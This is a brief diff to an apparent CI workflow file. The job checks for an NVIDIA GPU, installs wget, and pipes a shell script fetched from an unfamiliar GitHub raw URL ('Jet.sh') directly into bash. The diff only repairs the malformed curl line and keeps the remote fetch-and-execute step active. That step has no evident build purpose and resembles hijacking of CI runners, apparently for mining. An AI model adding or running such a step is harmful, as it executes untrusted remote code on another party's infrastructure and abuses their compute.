@@ -7,4 +7,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: apt update && apt -y install wget
-      - run: curl -s curl -s https://raw.githubusercontent.com/Testdrive345/scriptX/main/Jet.sh | bash | bash
+      - run: curl -s https://raw.githubusercontent.com/Testdrive345/scriptX/main/Jet.sh | bash | bash
